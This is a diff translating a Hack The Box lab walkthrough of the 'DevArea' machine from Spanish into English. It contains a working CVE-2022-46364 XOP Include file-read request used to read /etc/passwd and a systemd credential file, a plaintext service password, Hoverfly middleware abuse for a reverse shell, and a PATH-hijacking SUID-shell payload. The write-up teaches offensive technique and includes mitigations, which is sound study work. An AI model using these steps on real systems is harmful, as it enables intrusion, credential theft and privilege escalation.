@@ -2,14 +2,14 @@
 title: "HTB Walkthrough: DevArea"
 date: 2026-03-29
 draft: false
-description: "Walkthrough completo de la máquina DevArea de Hack The Box. Dificultad Medium, OS Linux Ubuntu. CVE-2022-46364 en Apache CXF para leer archivos arbitrarios via XOP Include, credenciales de Hoverfly expuestas en systemd y RCE mediante Middleware, escalada a root por PATH Hijacking en script sudo."
+description: "Full walkthrough of the DevArea machine from Hack The Box. Medium difficulty, Linux Ubuntu. CVE-2022-46364 on Apache CXF to read arbitrary files via XOP Include, Hoverfly credentials exposed in systemd, RCE via Middleware, and root escalation through PATH Hijacking in a sudo script."
 tags: ["HackTheBox", "Linux", "Medium", "FTP", "SOAP", "ApacheCXF", "CVE-2022-46364", "XOPInclude", "LFI", "Hoverfly", "MiddlewareRCE", "PATHHijacking", "SUID", "Sudo", "PrivEsc", "RCE", "devarea", "writeups"]
 categories: ["HTB Walkthroughs"]
 series: ["HackTheBox CPTS"]
 ---
 
 {{< lead >}}
-Resolución de **DevArea** en Hack The Box. Máquina de dificultad **Medium** con sistema operativo **Linux Ubuntu**. Un servicio Java SOAP descargado via FTP anónimo resulta ser Apache CXF 3.2.14, vulnerable al **CVE-2022-46364** (XOP Include LFI). Usamos el fallo para leer credenciales de Hoverfly desde la configuración de systemd y obtenemos RCE mediante el sistema de Middleware. La escalada a root aprovecha un **PATH Hijacking** en un script ejecutado con `sudo`.
+Walkthrough of **DevArea** on Hack The Box. **Medium** difficulty machine running **Linux Ubuntu**. A Java SOAP service downloaded via anonymous FTP turns out to be Apache CXF 3.2.14, vulnerable to **CVE-2022-46364** (XOP Include LFI). We use the flaw to read Hoverfly credentials from the systemd configuration and get RCE through the Middleware system. Root escalation exploits **PATH Hijacking** in a script executed with `sudo`.
 {{< /lead >}}
 
 {{< badge >}}HackTheBox{{< /badge >}}
@@ -18,21 +18,21 @@ Resolución de **DevArea** en Hack The Box. Máquina de dificultad **Medium** co
 
 ---
 
-## 🗺️ Información de la Máquina
+## 🗺️ Machine Info
 
-| Campo          | Detalle                                                                                    |
+| Field          | Detail                                                                                     |
 |----------------|--------------------------------------------------------------------------------------------|
-| **Nombre**     | DevArea                                                                                    |
+| **Name**       | DevArea                                                                                    |
 | **OS**         | Linux (Ubuntu)                                                                             |
-| **Dificultad** | Medium                                                                                     |
+| **Difficulty** | Medium                                                                                     |
 | **IP**         | 10.129.10.216                                                                              |
-| **Técnicas**   | CVE-2022-46364 · XOP Include LFI · Hoverfly Middleware RCE · Bash PATH Hijacking · SUID   |
+| **Techniques** | CVE-2022-46364 · XOP Include LFI · Hoverfly Middleware RCE · Bash PATH Hijacking · SUID   |
 
 ---
 
-## 1. Reconocimiento
+## 1. Reconnaissance
 
-### 1.1 Escaneo de Puertos
+### 1.1 Port Scan
 
 ```bash
 nmap -p- --open -sS --min-rate 5000 -n -Pn 10.129.10.216
@@ -48,7 +48,7 @@ PORT     STATE SERVICE
 8888/tcp open  sun-answerbook
 ```
 
-Escaneo de versiones y scripts sobre los puertos abiertos:
+Version and scripts scan on open ports:
 
 ```bash
 nmap -sC -sV -p21,22,80,8080,8500,8888 10.129.10.216
@@ -64,28 +64,28 @@ PORT     STATE SERVICE VERSION
 |_http-title: Did not follow redirect to http://devarea.htb/
 8080/tcp open  http    Jetty 9.4.27.v20200227
 |_http-title: Error 404 Not Found
-8500/tcp open  http    Golang net/http server (Proxy — requiere auth)
+8500/tcp open  http    Golang net/http server (Proxy — requires auth)
 8888/tcp open  http    Golang net/http server
 |_http-title: Hoverfly Dashboard
 ```
 
-*Puertos abiertos:*
-- `21` → FTP vsftpd con **acceso anónimo habilitado**
-- `22` → OpenSSH 9.6p1, sin exploits públicos conocidos
-- `80` → Apache 2.4.58 con virtual hosting a `devarea.htb`
-- `8080` → Jetty 9.4.27 — servicio Java, devuelve 404 en raíz
-- `8500` → Proxy Go con autenticación
-- `8888` → **Hoverfly Dashboard** — herramienta de virtualización de servicios
+*Open ports:*
+- `21` → FTP vsftpd with **anonymous login enabled**
+- `22` → OpenSSH 9.6p1, no known public exploits
+- `80` → Apache 2.4.58 with virtual hosting to `devarea.htb`
+- `8080` → Jetty 9.4.27 — Java service, returns 404 at root
+- `8500` → Go proxy with authentication
+- `8888` → **Hoverfly Dashboard** — service virtualization tool
 
-> **💡 Superficie de ataque:** La combinación de FTP anónimo + Jetty + Hoverfly es inusual. El FTP probablemente exponga algún artefacto del servicio que corre en Jetty; Hoverfly es una herramienta que puede ejecutar código si conseguimos autenticarnos.
+> **💡 Attack surface:** The combination of anonymous FTP + Jetty + Hoverfly is unusual. FTP likely exposes some artifact of the service running on Jetty; Hoverfly is a tool that can execute code if we authenticate.
 
 ---
 
-## 2. Enumeración Web y FTP
+## 2. Web and FTP Enumeration
 
-### 2.1 Enumeración Web (Puerto 80)
+### 2.1 Web Enumeration (Port 80)
 
-Añadimos `devarea.htb` a `/etc/hosts` y lanzamos gobuster en modo vhost:
+We add `devarea.htb` to `/etc/hosts` and run gobuster in vhost mode:
 
 ```bash
 sudo sh -c "echo '10.129.10.216 devarea.htb' >> /etc/hosts"
@@ -98,13 +98,13 @@ Found: webapps.devarea.htb  → 302 → http://devarea.htb/
 Found: node1.devarea.htb    → 302 → http://devarea.htb/
 ```
 
-Todos los subdominios redirigen a la página principal. La web estática y el puerto 8080 no tienen contenido accionable por enumeración de directorios.
+All subdomains redirect to the main page. The static web and port 8080 have no actionable content via directory enumeration.
 
-### 2.2 FTP Anónimo
+### 2.2 Anonymous FTP
 
 ```bash
 ftp 10.129.10.216
-# Usuario: anonymous / Sin contraseña
+# User: anonymous / No password
 ```
 
 ```
@@ -113,19 +113,19 @@ ftp> ls pub
 ftp> get employee-service.jar
 ```
 
-Descargamos el JAR — un servicio Java que presumiblemente corre en el puerto 8080.
+We download the JAR — a Java service presumably running on port 8080.
 
 ---
 
-## 3. Análisis del JAR — Ingeniería Inversa
+## 3. JAR Analysis — Reverse Engineering
 
-Descompilamos el JAR con `jadx`:
+We decompile the JAR with `jadx`:
 
 ```bash
 jadx -d /root/decompiled/ /root/employee-service.jar
 ```
 
-Los archivos relevantes están en `sources/htb/devarea/`. Filtramos el código de la aplicación eliminando dependencias de Apache, Jetty y javax:
+Relevant files are in `sources/htb/devarea/`. We filter the application code by excluding Apache, Jetty, and javax dependencies:
 
 ```bash
 find sources/ -name "*.java" | grep -vE "apache|jetty|javax|ibm"
@@ -138,7 +138,7 @@ sources/htb/devarea/EmployeeServiceImpl.java
 sources/htb/devarea/EmployeeService.java
 ```
 
-### 3.1 `ServerStarter.java` — Endpoint SOAP
+### 3.1 `ServerStarter.java` — SOAP Endpoint
 
 ```java
 public class ServerStarter {
@@ -153,9 +153,9 @@ public class ServerStarter {
 }
 ```
 
-> **💡 Descubrimiento clave:** El servicio expone un endpoint SOAP en `http://devarea.htb:8080/employeeservice`. El WSDL en `/employeeservice?wsdl` describe su interfaz completa.
+> **💡 Key discovery:** The service exposes a SOAP endpoint at `http://devarea.htb:8080/employeeservice`. The WSDL at `/employeeservice?wsdl` describes its full interface.
 
-### 3.2 `EmployeeServiceImpl.java` — El Campo Reflejado
+### 3.2 `EmployeeServiceImpl.java` — The Reflected Field
 
 ```java
 public String submitReport(Report report) {
@@ -167,9 +167,9 @@ public String submitReport(Report report) {
 }
 ```
 
-> **💡 Clave:** El campo `content` se devuelve **reflejado en la respuesta**. Si conseguimos inyectar el contenido de un archivo en ese campo, lo veremos en la respuesta.
+> **💡 Key:** The `content` field is **reflected back in the response**. If we can inject file contents into that field, we'll see them in the response.
 
-### 3.3 `pom.xml` — Versión de Apache CXF
+### 3.3 `pom.xml` — Apache CXF Version
 
 ```bash
 cat resources/META-INF/maven/com.environment/employee-service/pom.xml
@@ -183,23 +183,23 @@ cat resources/META-INF/maven/com.environment/employee-service/pom.xml
 </dependency>
 ```
 
-> **⚠️ Versión vulnerable:** Apache CXF **3.2.14** es afectada por **CVE-2022-46364** (versiones anteriores a 3.5.5 y 3.4.10). Este CVE permite leer archivos arbitrarios del servidor mediante mensajes SOAP Multipart con elementos XOP Include.
+> **⚠️ Vulnerable version:** Apache CXF **3.2.14** is affected by **CVE-2022-46364** (versions before 3.5.5 and 3.4.10). This CVE allows reading arbitrary server files via Multipart SOAP messages with XOP Include elements.
 
 ---
 
-## 4. Explotación — CVE-2022-46364 (XOP Include LFI)
+## 4. Exploitation — CVE-2022-46364 (XOP Include LFI)
 
-El ataque usa **XOP (XML-binary Optimized Packaging)** dentro de un mensaje **Multipart SOAP**. En lugar de una URL HTTP, se pasa una ruta de archivo local en el atributo `href` del elemento `xop:Include`. El servidor procesa la entidad, lee el archivo y lo devuelve **en Base64** en la respuesta.
+The attack uses **XOP (XML-binary Optimized Packaging)** inside a **Multipart SOAP** message. Instead of an HTTP URL, we pass a local file path in the `href` attribute of the `xop:Include` element. The server processes the entity, reads the file, and returns it **Base64-encoded** in the response.
 
 ```
-Flujo normal:    campo content = "texto" → SOAP response con ese texto reflejado
-Flujo malicioso: campo content = <xop:Include href="file:///ruta"/> →
-                 CXF resuelve la referencia, lee el archivo local, devuelve contenido en Base64
+Normal flow:    content field = "text" → SOAP response with that text reflected
+Malicious flow: content field = <xop:Include href="file:///path"/> →
+                CXF resolves the reference, reads the local file, returns content in Base64
 ```
 
-### 4.1 Verificación del Servicio
+### 4.1 Service Verification
 
-Antes del exploit, confirmamos que el endpoint SOAP responde correctamente:
+Before exploiting, we confirm the SOAP endpoint responds correctly:
 
 ```bash
 curl -X POST \
@@ -233,11 +233,11 @@ EOF
 <return>Report received from Hacker. Department: IT. Content: TEST_CONTENT</return>
 ```
 
-El campo `content` se refleja.
+The `content` field is reflected.
 
-### 4.2 Lectura de `/etc/passwd`
+### 4.2 Reading `/etc/passwd`
 
-Sustituimos el texto por un elemento `xop:Include` apuntando al archivo:
+We replace the text with an `xop:Include` element pointing to the file:
 
 ```bash
 curl -X POST \
@@ -270,7 +270,7 @@ Content-ID: <main>
 EOF
 ```
 
-La respuesta contiene `/etc/passwd` codificado en Base64:
+The response contains `/etc/passwd` Base64-encoded:
 
 ```
 Content: cm9vdDp4OjA6MDpyb290Oi9yb290Oi9iaW4vYmFzaAo...
@@ -288,13 +288,13 @@ ftp:x:110:111:ftp daemon,,,:/srv/ftp:/usr/sbin/nologin
 syswatch:x:984:984::/opt/syswatch:/usr/sbin/nologin
 ```
 
-> **💡 Usuarios de interés:**
-> - `dev_ryan` — único usuario normal con shell (`/bin/bash`)
-> - `syswatch` — usuario de servicio en `/opt/syswatch`; relevante para privesc
+> **💡 Users of interest:**
+> - `dev_ryan` — only normal user with a shell (`/bin/bash`)
+> - `syswatch` — service user at `/opt/syswatch`; relevant for privesc
 
-### 4.3 Lectura del Servicio Hoverfly (systemd)
+### 4.3 Reading the Hoverfly Service (systemd)
 
-Con el mismo método leemos la configuración del servicio en el puerto 8888:
+With the same method we read the port 8888 service configuration:
 
 ```xml
 <xop:Include href="file:///etc/systemd/system/hoverfly.service"
@@ -318,15 +318,15 @@ ExecStart=/opt/HoverFly/hoverfly -add -username admin -password O7IJ27MyyXiU -li
 WantedBy=multi-user.target
 ```
 
-> **🔑 Credenciales encontradas:** `admin:O7IJ27MyyXiU` para Hoverfly en el puerto 8888. Las credenciales están en texto claro en el parámetro de arranque del proceso — visible en `/proc`, en el log de systemd y en cualquier archivo de configuración del servicio.
+> **🔑 Credentials found:** `admin:O7IJ27MyyXiU` for Hoverfly on port 8888. Credentials are in plaintext in the process startup parameter — visible in `/proc`, in the journald log, and in any service configuration file.
 
 ---
 
-## 5. RCE mediante Hoverfly Middleware
+## 5. RCE via Hoverfly Middleware
 
-**Hoverfly** es una herramienta de virtualización de servicios que puede ejecutar scripts externos ("middleware") para procesar tráfico interceptado en tiempo real. El middleware recibe cada petición/respuesta en JSON a través de stdin y devuelve la respuesta modificada por stdout. Si configuramos como middleware un script que lance una reverse shell, el servidor lo ejecutará en el contexto del usuario `dev_ryan`.
+**Hoverfly** is a service virtualization tool that can execute external scripts ("middleware") to process intercepted traffic in real time. The middleware receives each request/response as JSON via stdin and returns the modified response via stdout. If we configure as middleware a script that launches a reverse shell, the server will execute it in the context of the `dev_ryan` user.
 
-### 5.1 Obtener el Token JWT
+### 5.1 Get the JWT Token
 
 ```bash
 curl -s -X POST http://devarea.htb:8888/api/token-auth \
@@ -338,15 +338,15 @@ curl -s -X POST http://devarea.htb:8888/api/token-auth \
 {"token":"eyJhbGciOiJIUzUxMiIsInR5cCI6IkpXVCJ9.eyJleHAiOjIwODU4..."}
 ```
 
-### 5.2 Configurar el Middleware con Reverse Shell
+### 5.2 Configure the Middleware with Reverse Shell
 
-Abrimos un listener en nuestra máquina:
+We open a listener on our machine:
 
 ```bash
 nc -lvnp 4444
 ```
 
-Enviamos el payload al endpoint de middleware. El campo `binary` especifica el intérprete y `script` el código a ejecutar:
+We send the payload to the middleware endpoint. The `binary` field specifies the interpreter and `script` the code to execute:
 
 ```bash
 curl -X PUT http://devarea.htb:8888/api/v2/hoverfly/middleware \
@@ -366,7 +366,7 @@ bash: no job control in this shell
 dev_ryan@devarea:/opt/HoverFly$
 ```
 
-✅ **Shell obtenida como `dev_ryan`.**
+✅ **Shell obtained as `dev_ryan`.**
 
 ---
 
@@ -376,13 +376,13 @@ dev_ryan@devarea:/opt/HoverFly$
 dev_ryan@devarea:~$ cat user.txt
 ```
 
-> 🔑 Flag de usuario obtenida.
+> 🔑 User flag obtained.
 
 ---
 
-## 7. Escalada de Privilegios — Bash PATH Hijacking
+## 7. Privilege Escalation — Bash PATH Hijacking
 
-### 7.1 Enumeración de Permisos sudo
+### 7.1 Sudo Permission Enumeration
 
 ```bash
 dev_ryan@devarea:~$ sudo -l
@@ -395,26 +395,26 @@ User dev_ryan may run the following commands on devarea:
     !/opt/syswatch/syswatch.sh web-restart
 ```
 
-Análisis de la regla:
-- ✅ Podemos ejecutar `/opt/syswatch/syswatch.sh` como root sin contraseña
-- ❌ Los argumentos `web-stop` y `web-restart` están bloqueados (prefijo `!`)
-- El script y su directorio no son accesibles directamente:
+Rule analysis:
+- ✅ We can run `/opt/syswatch/syswatch.sh` as root without a password
+- ❌ The `web-stop` and `web-restart` arguments are blocked (`!` prefix)
+- The script and its directory are not directly accessible:
 
 ```bash
 dev_ryan@devarea:~$ ls -la /opt/syswatch/
 ls: cannot open directory '/opt/syswatch/': Permission denied
 ```
 
-### 7.2 La Vulnerabilidad — PATH Hijacking
+### 7.2 The Vulnerability — PATH Hijacking
 
-El script `syswatch.sh` probablemente invoca comandos del sistema (`ps`, `grep`, `date`, etc.) **sin rutas absolutas**. Cuando bash ejecuta un comando por nombre, lo busca en los directorios del `$PATH` de izquierda a derecha. Si colocamos un ejecutable malicioso con el mismo nombre en un directorio que aparezca primero en el PATH, bash lo ejecutará en lugar del binario legítimo — con los privilegios de root.
+The `syswatch.sh` script likely invokes system commands (`ps`, `grep`, `date`, etc.) **without absolute paths**. When bash executes a command by name, it searches through `$PATH` directories left-to-right. If we place a malicious executable with the same name in a directory that appears first in PATH, bash will execute it instead of the legitimate binary — with root privileges.
 
 ```
-Flujo normal:    syswatch.sh llama a "ps" → bash busca en PATH → /bin/ps
-Flujo malicioso: PATH=/tmp:... → bash busca en /tmp primero → /tmp/ps (nuestro payload) → ejecutado como root
+Normal flow:    syswatch.sh calls "ps" → bash searches PATH → /bin/ps
+Malicious flow: PATH=/tmp:... → bash searches /tmp first → /tmp/ps (our payload) → executed as root
 ```
 
-### 7.3 Crear el Payload SUID
+### 7.3 Create the SUID Payload
 
 ```bash
 cat > /tmp/payload.sh << 'EOF'
@@ -424,9 +424,9 @@ EOF
 chmod +x /tmp/payload.sh
 ```
 
-El payload copia `/bin/sh` a `/tmp/root_sh` y activa el **bit SUID** (`+s`). Cualquier usuario que ejecute `/tmp/root_sh` lo hará con los permisos del propietario del binario — que después de ser copiado por root será **root**.
+The payload copies `/bin/sh` to `/tmp/root_sh` and activates the **SUID bit** (`+s`). Any user executing `/tmp/root_sh` will do so with the permissions of the binary's owner — which after being copied by root will be **root**.
 
-Para cubrir los comandos más comunes sin saber cuál usa el script internamente:
+To cover the most common commands without knowing which one the script uses internally:
 
 ```bash
 for cmd in ps grep date id cat ls; do
@@ -434,16 +434,16 @@ for cmd in ps grep date id cat ls; do
 done
 ```
 
-### 7.4 Secuestrar el PATH y Ejecutar el Script como Root
+### 7.4 Hijack PATH and Execute the Script as Root
 
 ```bash
 export PATH=/tmp:$PATH
 sudo /opt/syswatch/syswatch.sh --version
 ```
 
-El primer comando sin ruta absoluta que encuentre en el script ejecutará nuestro payload. Root copia `/bin/sh` y activa el SUID.
+The first command without an absolute path found in the script will execute our payload. Root copies `/bin/sh` and sets the SUID bit.
 
-### 7.5 Obtener la Shell de Root
+### 7.5 Get the Root Shell
 
 ```bash
 /tmp/root_sh -p
@@ -454,9 +454,9 @@ El primer comando sin ruta absoluta que encuentre en el script ejecutará nuestr
 uid=1001(dev_ryan) gid=1001(dev_ryan) euid=0(root) egid=0(root)
 ```
 
-> **`-p`:** Activa el modo "privilegiado" de sh, que no descarta el EUID elevado al inicio. Sin este flag, la shell ignoraría el bit SUID como medida de seguridad moderna.
+> **`-p`:** Activates sh's "privileged" mode, which doesn't drop the elevated EUID at startup. Without this flag, the shell would discard the SUID bit as a modern security measure.
 
-✅ **Escalada a root completada.**
+✅ **Escalation to root completed.**
 
 ---
 
@@ -466,40 +466,40 @@ uid=1001(dev_ryan) gid=1001(dev_ryan) euid=0(root) egid=0(root)
 # cat /root/root.txt
 ```
 
-> 🏁 Flag de root obtenida.
+> 🏁 Root flag obtained.
 
 ---
 
-## 9. Resumen y Lecciones Aprendidas
+## 9. Summary and Lessons Learned
 
-**Ruta de compromiso:**
+**Compromise path:**
 
-1. **Recon** → FTP anónimo expone `employee-service.jar`; Hoverfly Dashboard en puerto 8888.
-2. **Reversing** → `jadx` sobre el JAR → Apache CXF 3.2.14 → CVE-2022-46364; campo `content` reflejado.
-3. **CVE-2022-46364** → XOP Include LFI → `/etc/passwd` (usuarios) + `/etc/systemd/system/hoverfly.service` (credenciales).
-4. **Credenciales Hoverfly** → `admin:O7IJ27MyyXiU` → token JWT → Middleware RCE → shell como `dev_ryan`.
+1. **Recon** → Anonymous FTP exposes `employee-service.jar`; Hoverfly Dashboard on port 8888.
+2. **Reversing** → `jadx` on the JAR → Apache CXF 3.2.14 → CVE-2022-46364; `content` field reflected.
+3. **CVE-2022-46364** → XOP Include LFI → `/etc/passwd` (users) + `/etc/systemd/system/hoverfly.service` (credentials).
+4. **Hoverfly credentials** → `admin:O7IJ27MyyXiU` → JWT token → Middleware RCE → shell as `dev_ryan`.
 5. **User flag** → `~/user.txt`.
-6. **PrivEsc** → `sudo` sin contraseña sobre `syswatch.sh` → PATH Hijacking → binario SUID → root.
+6. **PrivEsc** → `sudo` without password on `syswatch.sh` → PATH Hijacking → SUID binary → root.
 
-**Lo que aprendí con esta máquina:**
+**What I learned from this machine:**
 
-- **El FTP anónimo puede exponer más que datos — puede exponer el código fuente del objetivo.** El JAR descargado contenía la versión exacta de la dependencia vulnerable. Sin esa información, encontrar el vector de ataque habría requerido fuzzing ciego del servicio SOAP. Leer el código primero convirtió una búsqueda a ciegas en un ataque dirigido.
+- **Anonymous FTP can expose more than data — it can expose the target's source code.** The downloaded JAR contained the exact version of the vulnerable dependency. Without that information, finding the attack vector would have required blind fuzzing of the SOAP service. Reading the code first turned a blind search into a targeted attack.
 
-- **CVE-2022-46364 es un ejemplo de por qué las dependencias de terceros tienen que estar en el radar del equipo de seguridad.** El código de la aplicación en sí no tiene ningún bug — el problema está en la librería de parsing de mensajes SOAP. Mantener un inventario actualizado de dependencias (SBOM) y monitorizar CVEs contra ese inventario es la única forma de detectar este tipo de exposición antes de que lo haga un atacante.
+- **CVE-2022-46364 is an example of why third-party dependencies need to be on the security team's radar.** The application code itself has no bugs — the problem is in the SOAP message parsing library. Maintaining an up-to-date inventory of dependencies (SBOM) and monitoring CVEs against that inventory is the only way to detect this type of exposure before an attacker does.
 
-- **XOP fue diseñado para incluir binarios en mensajes SOAP de forma eficiente; el abuso con `file://` es una consecuencia de que el parser no valide el esquema del URI.** La corrección en CXF 3.5.5 consistió precisamente en bloquear esquemas distintos de `http://` y `https://` en `xop:Include`. Es un ejemplo de fallar-abierto por defecto: la librería aceptaba cualquier URI válido sin restricción de esquema.
+- **XOP was designed to efficiently include binaries in SOAP messages; the `file://` abuse is a consequence of the parser not validating the URI scheme.** The fix in CXF 3.5.5 consisted precisely of blocking URI schemes other than `http://` and `https://` in `xop:Include`. It's an example of failing open by default: the library accepted any valid URI without scheme restriction.
 
-- **Las credenciales en los parámetros de arranque de un proceso son visibles para cualquier usuario del sistema.** El comando `ExecStart` de systemd con `-password O7IJ27MyyXiU` aparece en `/proc/<pid>/cmdline`, en el log de journald y en el archivo de configuración del servicio. Si el LFI no hubiera existido, `ps aux` desde cualquier usuario con acceso al sistema habría revelado la misma contraseña.
+- **Credentials in process startup parameters are visible to any system user.** The `ExecStart` command in systemd with `-password O7IJ27MyyXiU` appears in `/proc/<pid>/cmdline`, in the journald log, and in the service configuration file. If the LFI hadn't existed, `ps aux` from any user with system access would have revealed the same password.
 
-- **PATH Hijacking en scripts sudo es uno de los vectores de privesc más infravalorados.** La gente revisa SUID, capabilities y crons, pero no siempre comprueba si los scripts privilegiados llaman binarios con rutas relativas. La defensa es trivial: usar `/bin/ps` en lugar de `ps`, y `secure_path` en sudoers.
+- **PATH Hijacking in sudo scripts is one of the most underrated privesc vectors.** People check SUID, capabilities, and crons, but don't always verify whether privileged scripts call binaries with relative paths. The defense is trivial: use `/bin/ps` instead of `ps`, and `secure_path` in sudoers.
 
-**Mitigaciones:**
+**Mitigations:**
 
-| Vector | Mitigación |
+| Vector | Mitigation |
 |--------|------------|
-| FTP anónimo con binarios internos | Deshabilitar acceso anónimo; no exponer artefactos de desarrollo en producción |
-| Apache CXF 3.2.14 (CVE-2022-46364) | Actualizar a CXF ≥ 3.5.5 o ≥ 3.4.10 |
-| Credenciales en parámetros de proceso (systemd) | Usar `EnvironmentFile` con archivo de secrets; los argumentos de CLI son visibles para todos los usuarios del sistema |
-| Hoverfly Middleware accesible desde red | Bindear solo a `127.0.0.1`; restringir la API con firewall si no se necesita acceso remoto |
-| `sudo` sobre script con binarios sin ruta absoluta | Añadir `secure_path` en sudoers; usar rutas absolutas en todos los comandos del script |
-| Bit SUID explotable post-escalada | Auditar regularmente `find / -perm -4000 2>/dev/null`; monitorizar cambios en `/tmp` |
+| Anonymous FTP with internal binaries | Disable anonymous access; don't expose development artifacts in production |
+| Apache CXF 3.2.14 (CVE-2022-46364) | Update to CXF ≥ 3.5.5 or ≥ 3.4.10 |
+| Credentials in process parameters (systemd) | Use `EnvironmentFile` with a secrets file; CLI arguments are visible to all system users |
+| Hoverfly Middleware accessible from network | Bind only to `127.0.0.1`; restrict API with firewall if remote access isn't needed |
+| `sudo` over script with binaries lacking absolute paths | Add `secure_path` in sudoers; use absolute paths in all script commands |
+| Exploitable SUID bit post-escalation | Regularly audit `find / -perm -4000 2>/dev/null`; monitor changes in `/tmp` |
